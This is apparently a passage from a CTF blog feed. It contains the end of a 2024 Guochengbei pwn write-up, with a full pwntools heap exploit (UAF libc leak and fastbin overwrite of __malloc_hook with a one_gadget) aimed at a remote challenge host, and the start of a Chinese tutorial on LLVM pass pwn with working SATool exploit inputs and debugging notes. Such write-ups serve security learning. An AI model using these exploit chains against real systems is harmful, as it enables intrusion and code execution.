class="line">p.recvuntil(<span class="string">&quot;which one to choose&quot;</span>)</span><br><span class="line">payload=p64(system)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *0x401484&quot;)</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">4</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;which one to choose&quot;</span>)</span><br><span class="line">payload=p64(<span class="number">0x401515</span>)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="vtable-hijack"><a href="#vtable-hijack" class="headerlink" title="vtable_hijack"></a>vtable_hijack</h2><p>2.23版本堆题，有UAF和edit函数堆溢出，几乎就是随便打。看到vtable还以为是什么新型IO题，结果看到这道题解出人数哐哐上升。</p><p>这里直接套UAF板子来打了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;125.70.243.22&#x27;</span>, <span class="number">31046</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x3f3e6</span>, <span class="number">0x3f43a</span>, <span class="number">0xd5c07</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;size:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content=<span class="string">b&#x27;deafbeef&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;length:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x18</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libc_base = u64(r.recvuntil(<span class="string">b&#x27;\x0a&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">                [-<span class="number">7</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x39bb78</span></span><br><span class="line">log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># edit(4, p64(libc_base+0x3c3b10-0x23))</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="number">8</span>, p64(libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="number">27</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(libc_base+one[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">2024国城杯初赛，pwn题挺水的，被打烂了</summary>
    
    
    
    <category term="WP" scheme="https://c-lby.top/categories/WP/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="WP" scheme="https://c-lby.top/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>llvm pass pwn 入门</title>
    <link href="https://c-lby.top/2024/first-llvm-pass-pwn/"/>
    <id>https://c-lby.top/2024/first-llvm-pass-pwn/</id>
    <published>2024-11-28T03:33:34.000Z</published>
    <updated>2024-11-28T19:53:10.895Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>本来在前段时间学会protobuf逆向之后，想着直接又去学习llvm pass pwn，然后发现，看不懂（悲）。近段时间刚好在啃编译原理的龙书，掌握了一些概念和理论，又回到这里来，才终于能看懂并且开始复现一些简单的题目。入门学习的资料有两个，一个是<a href="https://blog.csdn.net/qq_54218833/article/details/125699994">C0lin师傅</a>的，一个是<a href="https://mp.weixin.qq.com/s/krgZmUWWpO3ajGGwYPzKdw">返璞归真师傅</a>的。</p><h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p>其实环境安装在返璞归真师傅的文章里有讲到，我这里记录一些他没提到的问题和常用的东西。</p><p>有些远古题目比如2021年的题用的llvm-8来出的，那我们就需要安装clang-8。但是，ubuntu22下apt安装并不能安装这个版本的clang，用<code>sudo apt search clang</code>可以验证，是找不到这个版本的，但是ubuntu20下就能够成功安装。相同版本的clang在不同版本的libc下可能会有不同的表现，具体可能表现在堆布局等方面。问就是复现的时候发现有不一样的地方。</p><p>各种格式相互转换的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.c -&gt; .ll：clang -emit-llvm -S a.c -o a.ll</span><br><span class="line">.c -&gt; .bc: clang -emit-llvm -c a.c -o a.bc</span><br><span class="line">.ll -&gt; .bc: llvm-as a.ll -o a.bc</span><br><span class="line">.bc -&gt; .ll: llvm-dis a.bc -o a.ll</span><br><span class="line">.bc -&gt; .s: llc a.bc -o a.s</span><br></pre></td></tr></table></figure><p>本地验证攻击脚本的命令(以simpleVM为例)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./opt -load ./VMPass.so -VMPass exp.ll</span><br><span class="line"></span><br><span class="line">./opt -load ./xxx.so -xxx ./exp.&#123;ll/bc&#125;</span><br></pre></td></tr></table></figure><h2 id="概念相关"><a href="#概念相关" class="headerlink" title="概念相关"></a>概念相关</h2><p>我这里记录补充一些我自己的发现或者理解。</p><p>opt是一个用来对IR代码进行优化分析的程序，它有内置的优化级别，是可以直接使用的，比如<code>opt -O3 input.ll -o output.ll</code>意思是进行O3级别的优化。这个优化的方法和方式，是可以通过加载模块来实现自定义的。题目中给出来的.so文件就是我们所说的模块。在查llvm资料的时候经常能看到的一个说法是“写一个pass”，这个所谓的pass指的就是自定义模块。pass的类型可以分成function pass、module pass、loop pass等，目前CTF中常见的是function pass，也就是对于特定函数的优化分析。一般题目会给出opt，可以用来查询llvm的版本。</p><p>自定义模块并不是opt一开始执行就加载进来了的，他是在main函数中通过一个函数加载进来的，这个函数的完整名称（包含类名）是<code>llvm::cl::ParseCommandLineOptions</code>。所以一开始断点就可以直接断在这个函数上，这个函数执行完之后，就可以断点在runOnFunction上了。</p><p>自定义模块如果要对特定单个函数（function pass）进行优化，那么一定会继承llvm原本的FunctionPass类，重写<code>runOnFunction</code>函数，他的完整名称叫<code>llvm::FPPassManager::runOnFunction</code>。签名是<code>virtual bool runOnFunction(Function &amp;F) = 0;</code>所以调用它的函数应该是个大循环，将.ll文件中的函数一个一个传进去去进行优化分析。</p><p>有些题目会把runonfunction的符号去掉，我们可以在程序的虚表，也就是.data.rel.ro段的最后一个函数找到他。</p><h2 id="CISCN2021-SATool-复现"><a href="#CISCN2021-SATool-复现" class="headerlink" title="CISCN2021 SATool(复现)"></a>CISCN2021 SATool(复现)</h2><h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>这道题C0lin师傅讲的很详细了，网上也有其他题解。尽管如此，我在复现的时候还是遇到了一些问题。这里先把问题放出来：</p><ol><li>写出来的exp.c如果转成.ll可以成功攻击，但是如果是转成exp.bc就会段错误。这个问题我还没找到原因和解决方案。</li></ol><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>调试环境是ubuntu20。解题思路不再赘述，下面的分析用一个可以打通的脚本去进行调试，并且基于已经知道了解题思路的前提。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">int</span> d)</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line"></span><br><span class="line">    save(<span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    stealkey();</span><br><span class="line">    fakekey(<span class="number">-0x1090f2</span>);</span><br><span class="line">    run();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>clang-8 -emit-llvm -S exp.c -o exp.ll</code>首先生成.ll文件，然后<code>gdb opt</code>启动调试。第一件事先在<code>llvm::cl::ParseCommandLineOptions</code>下断点，查看backtrace可以看到执行完这个函数之后会返回到0x4b8d65，我们在这里也下一个断点。</p><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/satool-%E6%A8%A1%E5%9D%97%E5%8A%A0%E8%BD%BD%E5%89%8D.png" alt="satool-模块加载前"></p><p>回到main函数之后，此时自定义模块已经被加载进程序里了，可以给runOnFunction下断点了<code>b llvm::FPPassManager::runOnFunction</code>。这时候opt就会开始逐个将我们exp中出现的函数传入runOnFunction进行处理。如果此时给<code>llvm::Value::getName</code>也断点，查看现在正在处理的函数，刚好是按照我们exp中的顺序的。也就意味这我们需要跳四次runOnFunction才会来到对backdoor的处理。</p><p>在刚刚跳断点的时候我留了个心眼，我在每次跳完之后都查看了一下bins的情况，发现在开始遍历之前0x20的tcache中只有一个chunk。但是往后每一次断点，都是七个chunk。这和exp里的七次save就对上了。</p><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/satool-%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AAchunk.png" alt="satool-只有一个chunk"></p><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/satool-%E4%B8%83%E4%B8%AAchunk.png" alt="satool-七个chunk"></p><p>顺带一提，取unsortedbin的那次save，不用写\x00也是可以的，直接留空””，或者写0，效果是一样的。</p><h3 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h3><p>题目可以打通了，然后我突发奇想，把exp改了一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">int</span> d)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line"></span><br><span class="line">    save(<span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    stealkey();</span><br><span class="line">    fakekey(<span class="number">-0x1090f2</span>);</span><br><span class="line">    run();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把函数定义改成了声明，然后就打不通了。然后按照上面的方法断点，调试，发现只运行了一次runOnFunction然后程序就会报错了。再次调试，这次一直在单步尝试找出报错的函数，运行到getName函数的时候发现它处理的竟然是backdoor函数，也就是说那些声明并没有被传入runOnFunction。所以可以直接得出函数声明不会被当作函数处理吗？事情可能没有这么简单，我们需要进行一些验证。</p><p>首先我想到了，去查看一下.ll文件，看能不能找到一些头绪。为了防止exp运行报错，我将其缩减了一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">int</span> d)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其对应的exp.ll长这样：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">; <span class="type">ModuleID</span> = &#x27;exq.c&#x27;</span><br><span class="line"><span class="title">source_filename</span> = <span class="string">&quot;exq.c&quot;</span></span><br><span class="line"><span class="title">target</span> datalayout = <span class="string">&quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span></span><br><span class="line"><span class="title">target</span> triple = <span class="string">&quot;x86_64-pc-linux-gnu&quot;</span></span><br><span class="line"></span><br><span class="line">@.str = private unnamed_addr constant [<span class="number">9</span> x i8] c<span class="string">&quot;deadbeef\00&quot;</span>, align <span class="number">1</span></span><br><span class="line"></span><br><span class="line">; <span class="type">Function</span> <span class="type">Attrs</span>: noinline nounwind optnone uwtable</span><br><span class="line"><span class="title">define</span> dso_local i32 @<span class="type">B4ckDo0r</span>() #<span class="number">0</span> &#123;</span><br><span class="line">  call void @save(i8* getelementptr inbounds ([<span class="number">9</span> x i8], [<span class="number">9</span> x i8]* @.str, i32 <span class="number">0</span>, i32 <span class="number">0</span>), i8* getelementptr inbounds ([<span class="number">9</span> x i8], [<span class="number">9</span> x i8]* @.str, i32 <span class="number">0</span>, i32 <span class="number">0</span>))</span><br><span class="line">  ret i32 <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">declare</span> dso_local void @save(i8*, i8*) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="title">attributes</span> #<span class="number">0</span> = &#123; noinline nounwind optnone uwtable <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;min-legal-vector-width&quot;</span>=<span class="string">&quot;0&quot;</span> <span class="string">&quot;no-frame-pointer-elim&quot;</span>=<span class="string">&quot;true&quot;</span> <span class="string">&quot;no-frame-pointer-elim-non-leaf&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-jump-tables&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"><span class="title">attributes</span> #<span class="number">1</span> = &#123; <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-frame-pointer-elim&quot;</span>=<span class="string">&quot;true&quot;</span> <span class="string">&quot;no-frame-pointer-elim-non-leaf&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">!llvm.<span class="keyword">module</span>.flags = !&#123;!<span class="number">0</span>&#125;</span><br><span class="line">!llvm.ident = !&#123;!<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">!<span class="number">0</span> = !&#123;i32 <span class="number">1</span>, !<span class="string">&quot;wchar_size&quot;</span>, i32 <span class="number">4</span>&#125;</span><br><span class="line">!<span class="number">1</span> = !&#123;!<span class="string">&quot;clang version 8.0.1-9 (tags/RELEASE_801/final)&quot;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以发现，有定义的函数前的指令是define，然后函数声明的指令是declare，并且顺序被放到了后面。所以我们需要调试观察其是否会被传入到runOnFunction。结果就是，依然只执行了一次，这就意味着，declare类型的操作数确实并不会被当作函数处理。</p><p>那么，在simpleVM那道题里，exp中函数写成声明一样可以打通，那么这道题应该也有办法的。前面我们说过，在调用runOnFunction前，0x20的tcache中只有一个chunk，那是不是意味着，我们只需要save两次就够了？实践出真知。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">int</span> d)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save(<span class="string">&quot;deadbeef&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    <span class="comment">// save(&quot;deadbeef&quot;, &quot;deadbeef&quot;);</span></span><br><span class="line">    <span class="comment">// save(&quot;deadbeef&quot;, &quot;deadbeef&quot;);</span></span><br><span class="line">    <span class="comment">// save(&quot;deadbeef&quot;, &quot;deadbeef&quot;);</span></span><br><span class="line">    <span class="comment">// save(&quot;deadbeef&quot;, &quot;deadbeef&quot;);</span></span><br><span class="line">    <span class="comment">// save(&quot;deadbeef&quot;, &quot;deadbeef&quot;);</span></span><br><span class="line">    <span class="comment">// save(&quot;deadbeef&quot;, &quot;deadbeef&quot;);</span></span><br><span class="line"></span><br><span class="line">    save(<span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">    stealkey();</span><br><span class="line">    fakekey(<span class="number">-0x1090f2</span>);</span><br><span class="line">    run();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/satool-%E5%A3%B0%E6%98%8E%E5%8F%AF%E6%89%93%E9%80%9A.png" alt="satool-声明可打通"></p><h2 id="RedHat2021-simpleVM-复现"><a href="#RedHat2021-simpleVM-复现" class="headerlink" title="RedHat2021 simpleVM(复现)"></a>RedHat2021 simpleVM(复现)</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先现在函数表里找到占据位置较大的函数，确定runOnFunction函数是sub_6830。</p><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/%E7%A1%AE%E5%AE%9Arunonfunction%E4%BD%8D%E7%BD%AE.png" alt="确定runonfunction位置"></p><p>但是这个函数实在有些蹊跷，伪代码展现出来的东西逻辑非常奇怪</p><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/simpleVM-runonfunction.png" 